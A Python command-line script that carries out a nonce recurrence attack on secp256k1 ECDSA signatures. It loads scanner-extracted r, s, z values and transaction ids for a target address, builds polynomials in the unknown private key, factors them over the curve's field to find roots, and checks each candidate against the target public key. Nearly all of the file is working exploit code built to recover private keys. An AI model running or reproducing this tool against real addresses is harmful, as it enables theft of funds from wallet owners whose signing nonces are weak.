#!/usr/bin/env python3
"""Run the nonce recurrence attack against pre-extracted ECDSA signature data.

Accepts JSON files in the format produced by the signature scanner:
{
    "address": "...",
    "pubkey": "...",
    "signatures": [
        {"r": "0x...", "s": "0x...", "z": "0x...", "txid": "...", ...},
        ...
    ]
}

Tries sliding windows of N consecutive signatures looking for polynomial
nonce recurrence relations.
"""

import argparse
import json
import logging
import sys
import time
from collections import defaultdict
from itertools import permutations
from typing import Any, Dict, List, Optional, Tuple

import sympy as sp
from sympy import Poly, Symbol, GF

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
LOGGER = logging.getLogger("run_attack")

# secp256k1 curve order
ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

# Symbol for the private key unknown
dd = Symbol('dd')


def modinv(a: int, m: int) -> int:
    return pow(a % m, -1, m)


class NonceRecurrenceAttack:
    """Nonce recurrence attack using sympy for polynomial factoring over GF(ORDER)."""

    def __init__(self, n: int) -> None:
        self.N = n
        self.order = ORDER

    def k_ij_poly(self, i: int, j: int, h: List[int], r: List[int], s_inv: List[int]):
        """Compute (k_i - k_j) as a polynomial in dd over GF(order)."""
        hi = h[i] % self.order
        hj = h[j] % self.order
        s_invi = s_inv[i]
        s_invj = s_inv[j]
        ri = r[i] % self.order
        rj = r[j] % self.order
        coeff_d = (ri * s_invi - rj * s_invj) % self.order
        const_term = (hi * s_invi - hj * s_invj) % self.order
        # Return as a sympy Poly over GF(order)
        return Poly(coeff_d * dd + const_term, dd, domain=GF(self.order))

    def dpoly(self, n: int, i: int, j: int, h: List[int], r: List[int], s_inv: List[int]):
        """Recursively construct the polynomial whose roots include the private key."""
        if i == 0:
            k12 = self.k_ij_poly(j + 1, j + 2, h, r, s_inv)
            k23 = self.k_ij_poly(j + 2, j + 3, h, r, s_inv)
            k01 = self.k_ij_poly(j + 0, j + 1, h, r, s_inv)
            return k12 * k12 - k23 * k01

        left = self.dpoly(n, i - 1, j, h, r, s_inv)
        for m in range(1, i + 2):
            kij = self.k_ij_poly(j + m, j + i + 2, h, r, s_inv)
            left = left * kij

        right = self.dpoly(n, i - 1, j + 1, h, r, s_inv)
        for m in range(1, i + 2):
            kij = self.k_ij_poly(j, j + m, h, r, s_inv)
            right = right * kij

        return left - right

    def verify_key(self, private_key: int, h: List[int], r: List[int], s: List[int]) -> bool:
        """Verify a candidate key by checking (k*G).x == r for the first signature."""
        try:
            from ecdsa import SECP256k1 as curve
            G = curve.generator
            for i in range(min(len(h), 2)):
                s_inv_i = modinv(s[i], self.order)
                k_i = (s_inv_i * (h[i] + r[i] * private_key)) % self.order
                k_point = k_i * G
                if k_point.x() % self.order != r[i]:
                    return False
            return True
        except Exception:
            return False

    def attack(self, h: List[int], r: List[int], s: List[int], max_permutations: int = 24) -> Optional[int]:
        """Run the attack on the given signatures."""
        s_inv = [modinv(si, self.order) for si in s]
        indices = list(range(self.N))
        all_perms = list(permutations(indices))

        if max_permutations < len(all_perms):
            import random
            perms_to_try = random.sample(all_perms, max_permutations)
        else:
            perms_to_try = all_perms

        n = self.N - 4

        for perm in perms_to_try:
            h_perm = [h[i] for i in perm]
            r_perm = [r[i] for i in perm]
            s_inv_perm = [s_inv[i] for i in perm]
            s_perm = [s[i] for i in perm]

            try:
                poly = self.dpoly(n, n, 0, h_perm, r_perm, s_inv_perm)

                # Find roots by factoring the polynomial over GF(order)
                factors = poly.factor_list()[1]
                for factor, _mult in factors:
                    if factor.degree() == 1:
                        coeffs = factor.all_coeffs()
                        if not coeffs or int(coeffs[0]) == 0:
                            continue
                        # root = -coeffs[1] / coeffs[0] mod order
                        root = (-int(coeffs[1]) * modinv(int(coeffs[0]), self.order)) % self.order
                        if 1 <= root < self.order:
                            if self.verify_key(root, h_perm, r_perm, s_perm):
                                return root
            except Exception:
                continue

        return None


def load_scanner_json(file_path: str) -> Dict[str, Any]:
    with open(file_path, "r", encoding="utf-8") as f:
        return json.load(f)


def parse_signatures(data: Dict[str, Any]) -> List[Dict[str, Any]]:
    results = []
    for sig in data.get("signatures", []):
        results.append({
            "r": int(sig["r"], 16),
            "s": int(sig["s"], 16),
            "z": int(sig["z"], 16),
            "txid": sig.get("txid", "unknown"),
        })
    return results


def group_by_transaction(signatures: List[Dict[str, Any]]) -> Dict[str, List[Dict[str, Any]]]:
    groups = defaultdict(list)
    for sig in signatures:
        groups[sig["txid"]].append(sig)
    return groups


def verify_against_pubkey(private_key: int, pubkey_hex: str) -> bool:
    try:
        from ecdsa import SECP256k1 as curve
        G = curve.generator
        recovered_point = private_key * G
        prefix = b"\x02" if recovered_point.y() % 2 == 0 else b"\x03"
        recovered_hex = (prefix + recovered_point.x().to_bytes(32, "big")).hex()
        if recovered_hex == pubkey_hex:
            LOGGER.info("VERIFIED: Recovered key matches the target public key!")
            return True
        else:
            LOGGER.warning("Key does NOT match target pubkey")
            return False
    except Exception as exc:
        LOGGER.error("Verification error: %s", exc)
        return False


def run_transaction_group_attack(
    tx_groups: Dict[str, List[Dict[str, Any]]],
    window_size: int,
    max_permutations: int = 24,
    pubkey_hex: Optional[str] = None,
) -> Optional[int]:
    eligible = {k: v for k, v in tx_groups.items() if len(v) >= window_size}
    LOGGER.info("Transaction-group attack: N=%d, eligible_txs=%d", window_size, len(eligible))

    attack = NonceRecurrenceAttack(window_size)
    tx_count = 0

    for txid, sigs_in_tx in eligible.items():
        tx_count += 1
        if tx_count % 20 == 0:
            LOGGER.info("  Progress: %d/%d transactions", tx_count, len(eligible))

        for start in range(len(sigs_in_tx) - window_size + 1):
            window = sigs_in_tx[start:start + window_size]
            h = [s["z"] % ORDER for s in window]
            r = [s["r"] for s in window]
            s_vals = [s["s"] for s in window]

            result = attack.attack(h, r, s_vals, max_permutations=max_permutations)
            if result is not None:
                LOGGER.info("SUCCESS in txid %s at offset %d!", txid, start)
                if pubkey_hex:
                    verify_against_pubkey(result, pubkey_hex)
                return result

    return None


def run_sliding_window_attack(
    signatures: List[Dict[str, Any]],
    window_size: int,
    max_windows: int = 500,
    max_permutations: int = 24,
    pubkey_hex: Optional[str] = None,
) -> Optional[int]:
    total_possible = len(signatures) - window_size + 1
    windows_to_try = min(max_windows, total_possible)
    LOGGER.info("Sliding window attack: N=%d, windows=%d", window_size, windows_to_try)

    attack = NonceRecurrenceAttack(window_size)

    for i in range(windows_to_try):
        if (i + 1) % 50 == 0:
            LOGGER.info("  Progress: %d/%d windows", i + 1, windows_to_try)

        window = signatures[i:i + window_size]
        h = [s["z"] % ORDER for s in window]
        r = [s["r"] for s in window]
        s_vals = [s["s"] for s in window]

        result = attack.attack(h, r, s_vals, max_permutations=max_permutations)
        if result is not None:
            LOGGER.info("SUCCESS at sliding window index %d!", i)
            if pubkey_hex:
                verify_against_pubkey(result, pubkey_hex)
            return result

    return None


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Run nonce recurrence attack on pre-extracted signature data"
    )
    parser.add_argument("input_file", help="JSON file with signature data")
    parser.add_argument("--min-n", type=int, default=4, help="Min window size (default: 4)")
    parser.add_argument("--max-n", type=int, default=7, help="Max window size (default: 7)")
    parser.add_argument("--max-windows", type=int, default=500, help="Max sliding windows per N")
    parser.add_argument("--max-permutations", type=int, default=24, help="Max permutations per window")
    parser.add_argument("--strategy", choices=["sliding", "transaction", "all"], default="all")
    args = parser.parse_args()

    LOGGER.info("Loading signature data from %s", args.input_file)
    data = load_scanner_json(args.input_file)

    address = data.get("address", "unknown")
    pubkey_hex = data.get("pubkey")
    sig_count = data.get("signature_count", 0)

    LOGGER.info("Address: %s", address)
    LOGGER.info("Public key: %s", pubkey_hex)
    LOGGER.info("Signature count: %d", sig_count)
    LOGGER.info("R-reuse: %s | r_min_bits: %s | s_min_bits: %s",
                data.get("r_reuse_detected"), data.get("r_min_bits"), data.get("s_min_bits"))

    signatures = parse_signatures(data)
    LOGGER.info("Parsed %d signatures", len(signatures))

    tx_groups = group_by_transaction(signatures)
    LOGGER.info("Unique transactions: %d", len(tx_groups))

    start_time = time.time()
    recovered_key = None

    for n in range(args.min_n, args.max_n + 1):
        if recovered_key:
            break

        LOGGER.info("\n" + "=" * 60)
        LOGGER.info("TRYING N=%d (degree-%d polynomial recurrence)", n, n - 3)
        LOGGER.info("=" * 60)

        if args.strategy in ("transaction", "all"):
            recovered_key = run_transaction_group_attack(
                tx_groups, n,
                max_permutations=args.max_permutations,
                pubkey_hex=pubkey_hex,
            )
            if recovered_key:
                break

        if args.strategy in ("sliding", "all"):
            recovered_key = run_sliding_window_attack(
                signatures, n,
                max_windows=args.max_windows,
                max_permutations=args.max_permutations,
                pubkey_hex=pubkey_hex,
            )
            if recovered_key:
                break

    elapsed = time.time() - start_time

    print("\n" + "=" * 60)
    if recovered_key:
        print(f"PRIVATE KEY RECOVERED: {hex(recovered_key)}")
        print(f"Time elapsed: {elapsed:.2f} seconds")
    else:
        print("NO PRIVATE KEY FOUND")
        print(f"Tried N={args.min_n} through N={args.max_n}")
        print(f"Time elapsed: {elapsed:.2f} seconds")
        print("\nThe nonces likely do NOT follow a polynomial recurrence")
        print(f"relation of degree <= {args.max_n - 3} among the tested subsets.")
    print("=" * 60)


if __name__ == "__main__":
    main()
